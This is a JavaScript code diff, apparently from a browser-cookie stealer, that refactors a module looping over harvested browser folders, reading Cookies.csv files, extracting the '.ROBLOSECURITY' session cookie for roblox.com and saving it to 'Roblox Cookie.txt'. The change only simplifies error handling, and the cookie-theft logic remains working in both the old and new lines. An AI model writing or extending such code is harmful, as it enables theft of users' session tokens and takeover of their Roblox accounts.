@@ -8,15 +8,9 @@ const { writeFileSync } = require('fs');
 module.exports = async () => {
   for (const browser of fs.readdirSync(join(tempFolder, 'Browsers')).filter(f => f.split('.').length >= 1)) {
     const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
-    let line, shouldContinue = true;
-    try {
-      line = await searchForFile(file, 500);
-    } catch (e) {
-      shouldContinue = false;
-    }
-    if (!shouldContinue) return;
-    line = fs.readFileSync(file).toString().split('\n')
-      .find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
+    let line = await searchForFile(file, 500);
+    if (!line) return;
+    line = fs.readFileSync(file).toString().split('\n').find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
     if (!line) return;
     const cookie = line.split(',')[2];
     fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
